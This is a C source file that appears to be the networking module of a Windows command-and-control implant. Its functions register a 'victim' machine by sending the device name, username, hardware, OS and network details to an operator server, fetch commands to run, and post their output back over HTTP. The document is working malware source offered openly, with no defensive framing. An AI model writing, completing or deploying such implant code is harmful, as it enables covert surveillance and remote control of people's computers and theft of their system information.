#include <windows.h>
#include <stdio.h>
#include <winhttp.h>

#include "Typedefs.h"

#define WIN32_LEAN_AND_MEAN

#pragma comment(lib, "winhttp.lib")

void sendResult(const char* implantId, const char* operatorId, const char* output) {
    HINTERNET hSession, hConnect, hRequest;

    // Open an internet session
    hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("Error %u in WinHttpOpen.\n", GetLastError());
        return;
    }

    // Establish a connection to the HTTP service
    hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8081, 0);
    if (!hConnect) {
        printf("Error %u in WinHttpConnect.\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    // Open an HTTP request handle
    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/fetchOutput", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("Error %u in WinHttpOpenRequest.\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Create JSON data
    char data[1024];
    snprintf(data, sizeof(data),
        "{"
        "\"ImplantId\": \"%s\","
        "\"OperatorId\": \"%s\","
        "\"Output\": \"%s\","
        "\"DateFromLast\": \"%s\""
        "}",
        implantId, operatorId, output, "2023-08-06T15:04:05.07Z");

    // Send the request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, strlen(data), strlen(data), 0)) {
        printf("Error %u in WinHttpSendRequest.\n", GetLastError());
    }
    else {
        // Wait for the response
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            printf("Error %u in WinHttpReceiveResponse.\n", GetLastError());
        }
        else {
            printf("Request sent successfully!\n");
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}


void fetchCommand(Command* command) {
    HINTERNET hSession, hConnect, hRequest;
    DWORD dwSize, dwDownloaded;
    char jsonResponse[1024];

    // Open an internet session
    hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("Error %u in WinHttpOpen.\n", GetLastError());
        return;
    }

    // Establish a connection to the HTTP service
    hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8081, 0);
    if (!hConnect) {
        printf("Error %u in WinHttpConnect.\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    // Open an HTTP request handle
    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/fetchCommand", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("Error %u in WinHttpOpenRequest.\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Send the request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("Error %u in WinHttpSendRequest.\n", GetLastError());
    }
    else {
        // Wait for the response.
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            do {
                // Check for available data.
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                    printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                    break;
                }

                if (dwSize == 0) {
                    break; // No more data available
                }

                if (!WinHttpReadData(hRequest, (LPVOID)jsonResponse, sizeof(jsonResponse) - 1, &dwDownloaded)) {
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                    break;
                }

                jsonResponse[dwDownloaded] = '\0'; // Null-terminate the response
                printf("JSON Response: %s\n", jsonResponse);
                char tempCmdBuffer[256]; // Ensure the buffer size is large enough for your use case.

                sscanf(jsonResponse,
                    "{\"Input\":\"%[^\"]\","
                    "\"Command\":\"%[^\"]\","
                    "\"ImplantUser\":\"%[^\"]\","
                    "\"Operator\":\"%[^\"]\","
                    "\"delay\":\"%[^\"]\","
                    "\"timeToExec\":\"%[^\"]\","
                    "\"File\":\"%[^\"]\","
                    "\"nullterm\":\"%[^\"]\"}",
                    command->Input,
                    command->Cmd,   // Using tempCmdBuffer for the Command field
                    command->ImplantUser,
                    command->Operator,
                    command->Delay,
                    command->TimeToExec,
                    command->File,
                    command->NullTerm); // Assuming your Command structure has a "NullTerm" field



            } while (dwSize > 0);
        }
        else {
            printf("Error %u in WinHttpReceiveResponse.\n", GetLastError());
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

/*
{
    "implantId" : "<ID of the implant, Genesis do this using maybe like a simple MD5 hash of the device name>",
    "deviceName" : "<Name of the device/computer that has the implant running>",
    "username" : "<Username of the victim that has the implant running>",
    "operatorId": "<ID of the operator controlling the implant>",
    "cpuArchitecture" : "<Architecture of the computer CPU>",
    "gpuInformaton" : "<Information about the graphical processing unit>",
    "ramInformation" : "<Amount of Random Access Memory>",
    "operatingSystem" : "<Operating System the victim is running>",
    "networkInformation" : "<Information about the network the victim is connected to>",
    "currentDate" : "<Date which the implant registered for the first time>"
}
*/

void registerNewImplant(Victim* victim) {
    HINTERNET hSession, hConnect, hRequest;
    DWORD dwSize;

    // Open an internet session
    hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("Error %u in WinHttpOpen.\n", GetLastError());
        return;
    }

    hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8081, 0);
    if (!hConnect) {
        printf("Error %u in WinHttpConnect.\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/registerNewImplant", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("Error %u in WinHttpOpenRequest.\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Create JSON data
    char data[1024];
    snprintf(data, sizeof(data),
        "{"
        "\"ID\": \"%s\","
        "\"DeviceName\": \"%s\","
        "\"Username\": \"%s\","
        "\"OperatorID\": %s,"
        "\"CPUArchitecture\": \"%s\","
        "\"GPUInfo\": \"%s\","
        "\"RAMInfo\": %s,"
        "\"OSName\": \"%s\","
        "\"NetworkInfo\": \"%s\","
        "\"CurrentDate\": \"%s\""
        "}",
        victim->ID, victim->DeviceName, victim->Username, victim->OperatorID, victim->CPUArchitecture, victim->GPUInfo, victim->RAMInfo, victim->OSName, victim->NetworkInfo, "2023-08-06T15:04:05.07Z");

    // Send the request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, strlen(data), strlen(data), 0)) {
        printf("Error %u in WinHttpSendRequest.\n", GetLastError());
    }
    else {
        // Wait for the response.
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            printf("Request sent successfully!\n");
        }
        else {
            printf("Error %u in WinHttpReceiveResponse.\n", GetLastError());
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    printf("Implant Registered Successfully! \n");
}